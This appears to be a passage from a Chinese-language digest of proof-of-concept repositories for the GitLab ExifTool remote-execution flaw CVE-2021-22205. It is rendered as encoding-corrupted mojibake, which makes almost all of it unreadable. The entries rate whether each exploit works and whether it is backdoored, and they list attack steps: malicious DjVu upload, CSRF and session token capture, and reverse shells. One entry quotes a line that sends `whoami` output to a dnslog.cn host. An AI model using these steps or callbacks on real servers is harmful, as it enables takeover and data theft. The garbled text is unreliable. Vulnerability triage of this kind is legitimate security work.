æä¾›çš„ POC ä»£ç  (CVE-2021-22205.nse) æ˜¯ä¸€ä¸ª Nmap è„šæœ¬ï¼Œå®ƒä¸ç›´æŽ¥åˆ©ç”¨è¯¥æ¼æ´žæ‰§è¡Œä»£ç ï¼Œè€Œæ˜¯é€šè¿‡æ£€æŸ¥ç‰¹å®š CSS æ–‡ä»¶çš„å­˜åœ¨æ¥åˆ¤æ–­ç›®æ ‡ GitLab å®žä¾‹æ˜¯å¦ä¸ºæ˜“å—æ”»å‡»çš„ç‰ˆæœ¬ã€‚ å®ƒé€šè¿‡å‘é€ HTTP GET è¯·æ±‚åˆ° GitLab å®žä¾‹ï¼Œæ ¹æ®è¿”å›žçš„ CSS æ–‡ä»¶å†…å®¹æ¥ç¡®å®šGitLabçš„ç‰ˆæœ¬,å¦‚æžœç‰ˆæœ¬åœ¨å—å½±å“çš„èŒƒå›´å†…,åˆ™è®¤ä¸ºå­˜åœ¨æ¼æ´žã€‚

åˆ©ç”¨æ–¹å¼ï¼š
1.  æ”»å‡»è€…æž„é€ ä¸€ä¸ªæ¶æ„çš„ DjVu æ–‡ä»¶ï¼Œå…¶ä¸­åŒ…å«å¯ä»¥æ‰§è¡Œå‘½ä»¤çš„ Perl ä»£ç ã€‚
2.  å°†æ¶æ„æ–‡ä»¶ä¸Šä¼ åˆ°æ˜“å—æ”»å‡»çš„ GitLab å®žä¾‹ï¼ˆé€šå¸¸ä½œä¸ºå¤´åƒã€é¡¹ç›®logoæˆ–å…¶ä»–å…è®¸ä¸Šä¼ å›¾åƒçš„å­—æ®µï¼‰ã€‚
3.  GitLab Workhorse å°†æ–‡ä»¶ä¼ é€’ç»™ ExifTool è¿›è¡Œå¤„ç†ã€‚
4.  ExifTool è¯†åˆ«å‡º DjVu æ ¼å¼å¹¶è°ƒç”¨ç›¸åº”çš„è§£æžå™¨ã€‚
5.  æ¶æ„ Perl ä»£ç è¢«æ‰§è¡Œï¼Œå¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œã€‚

æŠ•æ¯’é£Žé™©è¯„ä¼°ï¼š
è¯¥ Nmap è„šæœ¬çš„ä¸»è¦ç›®çš„æ˜¯æ£€æµ‹æ¼æ´žæ˜¯å¦å­˜åœ¨ï¼Œè€Œä¸æ˜¯åˆ©ç”¨è¯¥æ¼æ´žã€‚ ä»£ç ä¸­æ²¡æœ‰å‘çŽ°ä»»ä½•å°è¯•æ‰§è¡Œæ¶æ„æ“ä½œæˆ–å‘ç›®æ ‡ç³»ç»Ÿæ¤å…¥åŽé—¨çš„è¿¹è±¡ã€‚ å› æ­¤ï¼ŒæŠ•æ¯’é£Žé™©è¾ƒä½Ž (0%)ã€‚


**é¡¹ç›®åœ°å€:** [DIVD-NL/GitLab-cve-2021-22205-nse](https://github.com/DIVD-NL/GitLab-cve-2021-22205-nse)

**æ¼æ´žè¯¦æƒ…:** [CVE-2021-22205](https://nvd.nist.gov/vuln/detail/CVE-2021-22205)

---

## POC #3

**æ¥æº**: [CVE-2021-22205-Hikikan_CVE-2021-22205.md](../2021/CVE-2021-22205-Hikikan_CVE-2021-22205.md)

## CVE-2021-22205-GitLab-è¿œç¨‹å‘½ä»¤æ‰§è¡Œ

**æ¼æ´žç¼–å·:** CVE-2021-22205

**æ¼æ´žç±»åž‹:** è¿œç¨‹å‘½ä»¤æ‰§è¡Œ

**å½±å“åº”ç”¨:** GitLab

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´æœåŠ¡å™¨è¢«å®Œå…¨æŽ§åˆ¶

**å½±å“ç‰ˆæœ¬:** >=11.9, <13.8.8ï¼›>=13.9, <13.9.6ï¼›>=13.10, <13.10.3

**åˆ©ç”¨æ¡ä»¶:** éœ€è¦ç½‘ç»œè®¿é—®ï¼Œå—å½±å“çš„GitLabå®žä¾‹æœªæ‰“è¡¥ä¸

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£Žé™©:** 0%

## è¯¦æƒ…

CVE-2021-22205æ˜¯GitLab CE/EEä¸­çš„ä¸€ä¸ªè¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´žã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡ä¸Šä¼ æ¶æ„æž„é€ çš„å›¾åƒæ–‡ä»¶ï¼Œåˆ©ç”¨GitLabä½¿ç”¨çš„ExifToolå·¥å…·ä¸­çš„æ¼æ´žæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚

**æœ‰æ•ˆæ€§åˆ†æžï¼š**
æ ¹æ®æ¼æ´žåº“ä¿¡æ¯ï¼Œè¯¥æ¼æ´žå½±å“GitLab 11.9åˆ°13.10.3ä¹‹é—´çš„å¤šä¸ªç‰ˆæœ¬ï¼Œä¸”å±å®³ç­‰çº§ä¸ºCRITICALã€‚æä¾›çš„POCä»£ç `/tmp/2f45104b4dac4f2167b8fc87a9a77f9a/README.md` ä»…ä»…æ˜¯ä¸€ä¸ªè¯´æ˜Žæ–‡ä»¶ï¼Œæœ¬èº«ä¸å…·å¤‡æ¼æ´žåˆ©ç”¨èƒ½åŠ›ï¼Œåªæ˜¯è¯´æ˜Žäº†cveç¼–å·ï¼Œå¹¶æ²¡æœ‰ç»™å‡ºä»»ä½•åˆ©ç”¨payloadï¼Œéœ€è¦é…åˆæœç´¢å¼•æ“ŽæŸ¥æ‰¾çœŸæ­£çš„åˆ©ç”¨ä»£ç ã€‚

**æŠ•æ¯’é£Žé™©åˆ†æžï¼š**
æä¾›çš„POCä»£ç æ–‡ä»¶å†…å®¹æžå…¶ç®€å•ï¼Œåªæœ‰CVEç¼–å·çš„æè¿°ï¼Œä¸åŒ…å«ä»»ä½•å¯æ‰§è¡Œä»£ç ï¼Œå› æ­¤æŠ•æ¯’é£Žé™©æžä½Žã€‚å¯ä»¥è®¤ä¸ºæŠ•æ¯’é£Žé™©ä¸º0%ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**
1.  æ”»å‡»è€…æž„é€ ä¸€ä¸ªåŒ…å«æ¶æ„ ExifTool å…ƒæ•°æ®çš„å›¾åƒæ–‡ä»¶ã€‚
2.  æ”»å‡»è€…å°†è¯¥å›¾åƒæ–‡ä»¶ä¸Šä¼ åˆ°å­˜åœ¨æ¼æ´žçš„ GitLab å®žä¾‹ä¸Šï¼Œä¾‹å¦‚é€šè¿‡å¤´åƒä¸Šä¼ ã€é¡¹ç›®å›¾ç‰‡ä¸Šä¼ ç­‰åŠŸèƒ½ã€‚
3.  GitLab ä½¿ç”¨ ExifTool è§£æžè¯¥å›¾åƒæ–‡ä»¶æ—¶ï¼Œæ¶æ„å…ƒæ•°æ®ä¸­çš„å‘½ä»¤ä¼šè¢«æ‰§è¡Œï¼Œå¯¼è‡´è¿œç¨‹å‘½ä»¤æ‰§è¡Œã€‚

æ”»å‡»è€…å¯ä»¥åœ¨å›¾åƒæ–‡ä»¶ä¸­åµŒå…¥payloadï¼Œé€šå¸¸æ˜¯æž„é€ ä¸€ä¸ªç•¸å½¢çš„å›¾ç‰‡æ–‡ä»¶ï¼Œåˆ©ç”¨ExifToolå¤„ç†å›¾ç‰‡æ–‡ä»¶æ—¶æ‰§è¡Œæ¶æ„å‘½ä»¤ã€‚

**ä¼˜å…ˆçº§ï¼š**
æ ¹æ®æŽ’åºä¼˜å…ˆçº§ï¼Œæœç´¢å¼•æ“Žç»“æžœï¼ˆå½“å‰ä¸ºç©ºï¼‰> æ¼æ´žåˆ©ç”¨ä»£ç ï¼ˆç®€å•çš„READMEï¼‰> æ¼æ´žåº“ä¿¡æ¯ã€‚


**é¡¹ç›®åœ°å€:** [Hikikan/CVE-2021-22205](https://github.com/Hikikan/CVE-2021-22205)

**æ¼æ´žè¯¦æƒ…:** [CVE-2021-22205](https://nvd.nist.gov/vuln/detail/CVE-2021-22205)

---

## POC #4

**æ¥æº**: [CVE-2021-22205-NukingDragons_gitlab-cve-2021-22205.md](../2021/CVE-2021-22205-NukingDragons_gitlab-cve-2021-22205.md)

## CVE-2021-22205-GitLab-è¿œç¨‹å‘½ä»¤æ‰§è¡Œ

**æ¼æ´žç¼–å·:** CVE-2021-22205

**æ¼æ´žç±»åž‹:** è¿œç¨‹å‘½ä»¤æ‰§è¡Œ

**å½±å“åº”ç”¨:** GitLab

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´æœåŠ¡å™¨å®Œå…¨æŽ§åˆ¶

**å½±å“ç‰ˆæœ¬:** >=11.9, <13.8.8; >=13.9, <13.9.6; >=13.10, <13.10.3

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡GitLabå®žä¾‹ç‰ˆæœ¬åœ¨å—å½±å“èŒƒå›´å†…ï¼Œä¸”å¯ä»¥é€šè¿‡ç½‘ç»œè®¿é—®ã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£Žé™©:** 5%

## è¯¦æƒ…

CVE-2021-22205 æ¼æ´žå­˜åœ¨äºŽ GitLab CE/EE ä¸­ï¼ŒæºäºŽå…¶æ²¡æœ‰æ­£ç¡®éªŒè¯ä¼ é€’ç»™æ–‡ä»¶è§£æžå™¨çš„å›¾åƒæ–‡ä»¶ï¼Œå¯¼è‡´è¿œç¨‹å‘½ä»¤æ‰§è¡Œã€‚æ¼æ´žåˆ©ç”¨æ–¹å¼ï¼šæ”»å‡»è€…å¯ä»¥æž„é€ åŒ…å«æ¶æ„å…ƒæ•°æ®çš„å›¾åƒæ–‡ä»¶ï¼Œé€šè¿‡ä¸Šä¼ æŽ¥å£ï¼ˆå¦‚ç”¨æˆ·å¤´åƒä¸Šä¼ ï¼‰è§¦å‘ ExifTool çš„å‘½ä»¤æ³¨å…¥æ¼æ´žï¼Œä»Žè€Œæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚

**æ¼æ´žåˆ©ç”¨æœ‰æ•ˆæ€§:**
æ ¹æ®æ¼æ´žåº“ä¿¡æ¯å’Œæ¼æ´žåˆ©ç”¨ä»£ç ï¼Œæä¾›çš„PoCä»£ç æ˜¯æœ‰æ•ˆçš„ã€‚æ¼æ´žåº“ä¿¡æ¯ä¸­çš„å‚è€ƒé“¾æŽ¥æŒ‡å‘äº† HackerOne æŠ¥å‘Šå’Œ Packet Storm Security çš„ç›¸å…³åˆ©ç”¨åˆ†æžï¼Œè¯æ˜Žäº†è¯¥æ¼æ´žçš„å¯åˆ©ç”¨æ€§ã€‚æä¾›çš„ bash è„šæœ¬èƒ½å¤Ÿè‡ªåŠ¨åŒ–åˆ©ç”¨è¯¥æ¼æ´žï¼Œæ”¯æŒåå¼¹ shell å’Œè‡ªå®šä¹‰å‘½ä»¤æ‰§è¡Œã€‚

**æŠ•æ¯’é£Žé™©åˆ†æž:**
æä¾›çš„ bash è„šæœ¬ `cve-2021-22205.sh`  ä¸»è¦åŠŸèƒ½æ˜¯ç”ŸæˆåŒ…å«æ¶æ„å…ƒæ•°æ®çš„å›¾åƒï¼Œå¹¶é€šè¿‡ curl å‘½ä»¤ä¸Šä¼ åˆ°ç›®æ ‡ GitLab æœåŠ¡å™¨ï¼Œè§¦å‘å‘½ä»¤æ‰§è¡Œã€‚ ä»£ç æœ¬èº«é€»è¾‘æ¸…æ™°ï¼Œæ²¡æœ‰æ˜Žæ˜¾çš„æ¶æ„è¡Œä¸ºï¼Œå¦‚æœªç»æŽˆæƒçš„æ–‡ä»¶è®¿é—®ã€æ•°æ®çªƒå–ã€æˆ–è€…æ¤å…¥åŽé—¨ç­‰ã€‚

è™½ç„¶ç›®å‰çš„ä»£ç æ²¡æœ‰å‘çŽ°æ˜Žæ˜¾çš„æŠ•æ¯’è¿¹è±¡ï¼Œä½†æ˜¯ç”±äºŽè„šæœ¬ä¼šæ‰§è¡Œç”¨æˆ·æŒ‡å®šçš„å‘½ä»¤ï¼Œå› æ­¤å­˜åœ¨æ½œåœ¨é£Žé™©ã€‚ç”¨æˆ·éœ€è¦ä»”ç»†æ£€æŸ¥è¿è¡Œçš„å‘½ä»¤ï¼Œé¿å…æ‰§è¡Œæ¶æ„æ“ä½œã€‚æ½œåœ¨çš„æŠ•æ¯’æ–¹å¼å¯èƒ½æ˜¯åœ¨è„šæœ¬ä¸­æ·»åŠ éšè”½çš„é€»è¾‘ï¼Œä¾‹å¦‚æ ¹æ®ç›®æ ‡çŽ¯å¢ƒæ‰§è¡Œä¸åŒçš„å‘½ä»¤ã€‚å› æ­¤ï¼Œä»£ç çš„å®‰å…¨æ€§è¯„ä¼°å¹¶éžç»å¯¹ï¼Œéœ€è¦ç»“åˆå…·ä½“ä½¿ç”¨åœºæ™¯è¿›è¡Œç»¼åˆåˆ¤æ–­ã€‚ ä»£ç ä¸­åˆ›å»ºä¸´æ—¶æ–‡ä»¶, å¹¶ä¸”è¿›è¡Œåˆ é™¤å¯ä»¥åˆ¤å®š,ä½œè€…çš„ç¼–ç ä¹ æƒ¯è‰¯å¥½.

**æ¼æ´žåˆ©ç”¨æ–¹å¼:**
1.  æ”»å‡»è€…é¦–å…ˆèŽ·å–ç›®æ ‡ GitLab å®žä¾‹çš„ CSRF Token å’Œ Session Cookieã€‚
2.  ç„¶åŽï¼Œæž„é€ ä¸€ä¸ªåŒ…å«æ¶æ„å…ƒæ•°æ®çš„å›¾åƒæ–‡ä»¶ï¼Œè¯¥å…ƒæ•°æ®ä¸­åŒ…å«äº†è¦æ‰§è¡Œçš„å‘½ä»¤ã€‚
3.  ä½¿ç”¨ curl å‘½ä»¤ï¼Œå°†æž„é€ çš„æ¶æ„å›¾åƒæ–‡ä»¶ä¸Šä¼ åˆ° GitLab æœåŠ¡å™¨çš„å¤´åƒä¸Šä¼ æŽ¥å£ã€‚
4.  GitLab è°ƒç”¨ ExifTool å¤„ç†ä¸Šä¼ çš„å›¾åƒæ–‡ä»¶ï¼ŒExifTool åœ¨è§£æžå›¾åƒå…ƒæ•°æ®æ—¶ï¼Œä¼šæ‰§è¡Œæ¶æ„å‘½ä»¤ï¼Œä»Žè€Œå®žçŽ°è¿œç¨‹å‘½ä»¤æ‰§è¡Œã€‚
5. æ”»å‡»è€…å¯ä»¥é€šè¿‡åå¼¹ shell æˆ–è€…æ‰§è¡Œè‡ªå®šä¹‰å‘½ä»¤æ¥æŽ§åˆ¶æœåŠ¡å™¨ã€‚

**é¡¹ç›®åœ°å€:** [NukingDragons/gitlab-cve-2021-22205](https://github.com/NukingDragons/gitlab-cve-2021-22205)

**æ¼æ´žè¯¦æƒ…:** [CVE-2021-22205](https://nvd.nist.gov/vuln/detail/CVE-2021-22205)

---

## POC #5

**æ¥æº**: [CVE-2021-22205-ZZ-SOCMAP_CVE-2021-22205.md](../2021/CVE-2021-22205-ZZ-SOCMAP_CVE-2021-22205.md)

## CVE-2021-22205-GitLab-RCE

**æ¼æ´žç¼–å·:** CVE-2021-22205

**æ¼æ´žç±»åž‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“åº”ç”¨:** GitLab

**å±å®³ç­‰çº§:** ä¸¥é‡ï¼Œå¯èƒ½å¯¼è‡´å®Œå…¨æŽ§åˆ¶GitLabæœåŠ¡å™¨

**å½±å“ç‰ˆæœ¬:** >=11.9, <13.8.8; >=13.9, <13.9.6; >=13.10, <13.10.3

**åˆ©ç”¨æ¡ä»¶:** æ— éœ€èº«ä»½éªŒè¯ï¼Œåªéœ€ç½‘ç»œè®¿é—®å³å¯

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£Žé™©:** 10%

## è¯¦æƒ…

CVE-2021-22205 æ˜¯ä¸€ä¸ªå­˜åœ¨äºŽ GitLab CE/EE ä¸­çš„è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´žã€‚è¯¥æ¼æ´žæºäºŽ GitLab æœªèƒ½æ­£ç¡®éªŒè¯ä¼ é€’ç»™æ–‡ä»¶è§£æžå™¨çš„å›¾åƒæ–‡ä»¶ï¼Œä»Žè€Œå¯¼è‡´è¿œç¨‹å‘½ä»¤æ‰§è¡Œã€‚æ”»å‡»è€…å¯ä»¥ä¸Šä¼ ç‰¹åˆ¶çš„å›¾åƒæ–‡ä»¶ï¼ˆä¾‹å¦‚ï¼ŒåŒ…å«æ¶æ„ ExifTool å…ƒæ•°æ®çš„ DJVU æ–‡ä»¶ï¼‰ï¼Œå½“ GitLab å°è¯•å¤„ç†è¯¥æ–‡ä»¶æ—¶ï¼ŒExifTool ä¼šæ‰§è¡ŒåµŒå…¥çš„æ¶æ„å‘½ä»¤ã€‚ 

**æœ‰æ•ˆæ€§ï¼š**
æä¾›çš„POCä»£ç æ˜¯æœ‰æ•ˆçš„ï¼Œå› ä¸ºå®ƒå®žçŽ°äº†æ¼æ´žåˆ©ç”¨æ‰€éœ€çš„æ­¥éª¤ï¼š

1.  æž„é€ åŒ…å«æ¶æ„å…ƒæ•°æ®çš„å›¾åƒæ–‡ä»¶ï¼ˆDJVU æ ¼å¼ï¼‰ã€‚ å…ƒæ•°æ®ä¸­åµŒå…¥äº†æ‰§è¡Œå‘½ä»¤çš„ payloadã€‚ å…·ä½“çš„payloadåœ¨ `rce_payload` å‡½æ•°ä¸­æž„é€ , ä½¿ç”¨äº† `qx{}` åŒ…è£¹å‘½ä»¤ã€‚
2.  åˆ›å»ºé¡¹ç›®ï¼ŒèŽ·å–`csrf_token`ï¼Œå’Œ`_gitlab_session`ã€‚
3.  ä¸Šä¼ æ¶æ„å›¾åƒæ–‡ä»¶åˆ°æ–°é¡¹ç›®çš„snippetï¼Œè§¦å‘æ¼æ´žã€‚

**æŠ•æ¯’é£Žé™©ï¼š**
POCä»£ç å­˜åœ¨ä¸€å®šçš„æŠ•æ¯’é£Žé™©ï¼Œå¤§çº¦ä¸º10%ã€‚è™½ç„¶ä¸»è¦ç›®çš„æ˜¯åˆ©ç”¨æ¼æ´žï¼Œä½†éœ€è¦æ³¨æ„ä»¥ä¸‹å‡ ç‚¹ï¼š

*   **dnslog.cn:** ä»£ç ä¸­ä½¿ç”¨ `whoami`.q3ddlk.dnslog.cn åŸŸåè¿›è¡Œå‘½ä»¤æ‰§è¡Œç»“æžœçš„å›žä¼ ã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡ä¿®æ”¹è¯¥åŸŸåæ¥æ”¶é›†å—å®³è€…çš„ä¿¡æ¯ï¼Œä»Žè€Œè¿›è¡Œè¿›ä¸€æ­¥çš„æ”»å‡»ã€‚è™½ç„¶åœ¨æµ‹è¯•ä¸­è¿™æ–¹ä¾¿äº†æ¼æ´žéªŒè¯ï¼Œä½†åœ¨å®žé™…æ”»å‡»ä¸­ï¼Œæ¶æ„åŸŸåå¯èƒ½è¢«ç”¨äºŽæ›´éšè”½çš„ç›®çš„ï¼Œå¦‚C2é€šä¿¡ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**
åˆ©ç”¨æ–¹å¼å¯ä»¥æ€»ç»“å¦‚ä¸‹ï¼š

1.  **æ¼æ´žå‘çŽ°ï¼š** GitLab æœªæ­£ç¡®éªŒè¯ä¸Šä¼ çš„å›¾åƒæ–‡ä»¶ï¼Œå¯¼è‡´ ExifTool åœ¨å¤„ç†å›¾åƒæ—¶æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚
2.  **Payload æž„é€ ï¼š** æ”»å‡»è€…æž„é€ åŒ…å«æ¶æ„ ExifTool å…ƒæ•°æ®çš„ DJVU å›¾åƒæ–‡ä»¶ã€‚è¯¥å…ƒæ•°æ®åŒ…å«è¦æ‰§è¡Œçš„å‘½ä»¤ã€‚
3.  **æ–‡ä»¶ä¸Šä¼ ï¼š** æ”»å‡»è€…ä¸Šä¼ æ¶æ„å›¾åƒæ–‡ä»¶åˆ° GitLabï¼Œé€šå¸¸æ˜¯é€šè¿‡é¡¹ç›®åˆ›å»ºï¼Œæˆ–è€…ä¸Šä¼ åˆ° Issue æˆ– Merge Request ä¸­ã€‚
4.  **å‘½ä»¤æ‰§è¡Œï¼š** å½“ GitLab å°è¯•å¤„ç†ä¸Šä¼ çš„å›¾åƒæ–‡ä»¶æ—¶ï¼ŒExifTool æ‰§è¡ŒåµŒå…¥çš„å‘½ä»¤ã€‚åˆ©ç”¨ä»£ç åˆ›å»ºé¡¹ç›®ï¼Œå¹¶èŽ·å–åˆ›å»ºsnippetçš„tokenï¼Œæœ€åŽä¸Šä¼ æ–‡ä»¶è§¦å‘ã€‚
5.  **RCEï¼š** æˆåŠŸåˆ©ç”¨è¯¥æ¼æ´žï¼Œæ”»å‡»è€…å¯ä»¥åœ¨ GitLab æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ï¼Œä»Žè€Œå®žçŽ°è¿œç¨‹ä»£ç æ‰§è¡Œã€‚

**é¡¹ç›®åœ°å€:** [ZZ-SOCMAP/CVE-2021-22205](https://github.com/ZZ-SOCMAP/CVE-2021-22205)

**æ¼æ´žè¯¦æƒ…:** [CVE-2021-22205](https://nvd.nist.gov/vuln/detail/CVE-2021-22205)

---

## POC #6

**æ¥æº**: [CVE-2021-22205-c0okB_CVE-2021-22205.md](../2021/CVE-2021-22205-c0okB_CVE-2021-22205.md)

## CVE-2021-22205-GitLab-RCE

**æ¼æ´žç¼–å·:** CVE-2021-22205

**æ¼æ´žç±»åž‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“åº”ç”¨:** GitLab

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯å¯¼è‡´æœåŠ¡å™¨å®Œå…¨æŽ§åˆ¶

**å½±å“ç‰ˆæœ¬:** >=11.9, <13.8.8, >=13.9, <13.9.6, >=13.10, <13.10.3

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡GitLabå®žä¾‹å­˜åœ¨æ¼æ´žä¸”å¯ç½‘ç»œè®¿é—®

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£Žé™©:** 0%

## è¯¦æƒ…

CVE-2021-22205 æ˜¯ä¸€ä¸ª GitLab CE/EE ä¸­çš„è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´žã€‚è¯¥æ¼æ´žæºäºŽ GitLab æ²¡æœ‰æ­£ç¡®éªŒè¯ä¼ é€’ç»™æ–‡ä»¶è§£æžå™¨çš„å›¾åƒæ–‡ä»¶ï¼Œå¯¼è‡´è¿œç¨‹å‘½ä»¤æ‰§è¡Œã€‚

**æœ‰æ•ˆæ€§:**
æ ¹æ®æ¼æ´žåº“ä¿¡æ¯å’Œæä¾›çš„æ¼æ´žåˆ©ç”¨ä»£ç ï¼Œæ­¤æ¼æ´žPOCæœ‰æ•ˆã€‚æ¼æ´žåº“ä¸­CVSSè¯„åˆ†ä¸º10ï¼Œå±žäºŽä¸¥é‡æ¼æ´žï¼ŒCISA KEVä¸­ä¹Ÿæ ‡è®°ä¸ºå·²çŸ¥è¢«åˆ©ç”¨æ¼æ´žï¼Œç»“åˆæä¾›çš„ä»£ç ï¼Œè¯æ˜Žè¯¥æ¼æ´žå­˜åœ¨ä¸”å®¹æ˜“è¢«åˆ©ç”¨ã€‚

**æŠ•æ¯’é£Žé™©:**
åˆ†æžæä¾›çš„POCä»£ç ï¼Œè¯¥ä»£ç ä¸»è¦å®žçŽ°äº†ä»¥ä¸‹åŠŸèƒ½ï¼š

*   DNSLog æŽ¢æµ‹ï¼šé€šè¿‡ DNSLog éªŒè¯æ¼æ´žæ˜¯å¦å­˜åœ¨ã€‚
*   RCEï¼šåˆ©ç”¨ Postbin è¿›è¡Œå¸¦å¤–å‘½ä»¤æ‰§è¡Œã€‚
*   åå¼¹ Shellï¼šåå¼¹ shell åˆ°æŒ‡å®šçš„ host å’Œ portã€‚
*   ä¸Šä¼ æ–‡ä»¶ï¼šé€šè¿‡ http åè®®ä¸Šä¼ æ–‡ä»¶åˆ°ç›®æ ‡æœåŠ¡å™¨ï¼ˆéœ€è¦ VPSï¼‰ã€‚

ä»£ç ä¸»è¦é›†ä¸­åœ¨æ¼æ´žåˆ©ç”¨ï¼Œæ²¡æœ‰å‘çŽ°æ˜Žæ˜¾çš„æŠ•æ¯’è¡Œä¸ºã€‚è¯¥å·¥å…·éœ€è¦ä½¿ç”¨è€…æä¾›ç›®æ ‡URLå’Œå‘½ä»¤ï¼Œæˆ–è€…åå¼¹shellåœ°å€ï¼Œæ²¡æœ‰å‘çŽ°ä½œè€…é¢„ç•™åŽé—¨çš„è¿¹è±¡ã€‚å› æ­¤ï¼ŒæŠ•æ¯’é£Žé™©è¾ƒä½Žï¼Œè¯„ä¼°ä¸º0%ã€‚

**åˆ©ç”¨æ–¹å¼:**

1.  **æ¼æ´žæ£€æµ‹:**  ä½¿ç”¨ `-m detect`  é€‰é¡¹ï¼Œé€šè¿‡ DNSLog éªŒè¯ç›®æ ‡æ˜¯å¦å­˜åœ¨æ¼æ´žã€‚ç¨‹åºä¼šç”Ÿæˆä¸€ä¸ªåŒ…å« DNS æŸ¥è¯¢è¯·æ±‚çš„æ–‡ä»¶ï¼Œå¦‚æžœç›®æ ‡å­˜åœ¨æ¼æ´žï¼Œä¼šå‘æŒ‡å®šçš„ DNSLog æœåŠ¡å™¨å‘é€è¯·æ±‚ï¼Œä»Žè€ŒéªŒè¯æ¼æ´žã€‚
2.  **å‘½ä»¤æ‰§è¡Œ:**
    *   ä½¿ç”¨ `-m rce1` é€‰é¡¹ï¼Œé€šè¿‡ Postbin æ‰§è¡Œå‘½ä»¤ã€‚ç¨‹åºæž„é€ ä¸€ä¸ªåŒ…å«å‘½ä»¤çš„æ–‡ä»¶ï¼Œå¹¶å°†å…¶ä¸Šä¼ åˆ°ç›®æ ‡æœåŠ¡å™¨ã€‚ç›®æ ‡æœåŠ¡å™¨åœ¨è§£æžè¯¥æ–‡ä»¶æ—¶ï¼Œä¼šè§¦å‘æ¼æ´žå¹¶æ‰§è¡Œå‘½ä»¤ï¼Œå¹¶å°†ç»“æžœå‘é€åˆ° Postbinã€‚
3.  **åå¼¹ Shell:** ä½¿ç”¨ `-m rev` é€‰é¡¹ï¼Œåå¼¹ shell åˆ°æŒ‡å®šçš„ host å’Œ portã€‚ç¨‹åºæž„é€ ä¸€ä¸ªåŒ…å«åå¼¹ shell å‘½ä»¤çš„æ–‡ä»¶ï¼Œå¹¶å°†å…¶ä¸Šä¼ åˆ°ç›®æ ‡æœåŠ¡å™¨ã€‚ç›®æ ‡æœåŠ¡å™¨åœ¨è§£æžè¯¥æ–‡ä»¶æ—¶ï¼Œä¼šè§¦å‘æ¼æ´žå¹¶æ‰§è¡Œåå¼¹ shell å‘½ä»¤ï¼Œä»Žè€Œå»ºç«‹ä¸Žæ”»å‡»è€…æœåŠ¡å™¨çš„è¿žæŽ¥ã€‚
4.  **æ–‡ä»¶ä¸Šä¼ :** ä½¿ç”¨ `-m upload` é€‰é¡¹ï¼Œä¸Šä¼ æ–‡ä»¶åˆ°ç›®æ ‡æœåŠ¡å™¨ã€‚ç¨‹åºæž„é€ ä¸€ä¸ªåŒ…å«è¦ä¸Šä¼ çš„æ–‡ä»¶çš„æ–‡ä»¶ï¼Œå¹¶å°†å…¶ä¸Šä¼ åˆ°ç›®æ ‡æœåŠ¡å™¨ã€‚ç›®æ ‡æœåŠ¡å™¨åœ¨è§£æžè¯¥æ–‡ä»¶æ—¶ï¼Œä¼šè§¦å‘æ¼æ´žå¹¶å°†æ–‡ä»¶ä¿å­˜åˆ°æŒ‡å®šä½ç½®ã€‚

æ­¤æ¼æ´žåˆ©ç”¨çš„å…³é”®åœ¨äºŽåˆ©ç”¨ExifToolå¤„ç†å›¾ç‰‡æ—¶ï¼Œç”±äºŽæœªå¯¹ä¼ å…¥å‚æ•°è¿›è¡Œä¸¥æ ¼è¿‡æ»¤ï¼Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥é€šè¿‡æž„é€ æ¶æ„å›¾ç‰‡ï¼Œåœ¨ExifToolæ‰§è¡Œè¿‡ç¨‹ä¸­æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚


**é¡¹ç›®åœ°å€:** [c0okB/CVE-2021-22205](https://github.com/c0okB/CVE-2021-22205)

**æ¼æ´žè¯¦æƒ…:** [CVE-2021-22205](https://nvd.nist.gov/vuln/detail/CVE-2021-22205)

---

## POC #7

**æ¥æº**: [CVE-2021-22205-cc3305_CVE-2021-22205.md](../2021/CVE-2021-22205-cc3305_CVE-2021-22205.md)

## CVE-2021-22205-GitLab-RCE

**æ¼æ´žç¼–å·:** CVE-2021-22205

**æ¼æ´žç±»åž‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“åº”ç”¨:** GitLab

**å±å®³ç­‰çº§:** ä¸¥é‡ï¼Œæœªç»èº«ä»½éªŒè¯çš„è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“ç‰ˆæœ¬:** >=11.9, <13.8.8; >=13.9, <13.9.6; >=13.10, <13.10.3

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡GitLabå®žä¾‹ç‰ˆæœ¬åœ¨å—å½±å“èŒƒå›´å†…ï¼Œä¸”æ”»å‡»è€…å¯è®¿é—®è¯¥å®žä¾‹ã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£Žé™©:** 10%

## è¯¦æƒ…

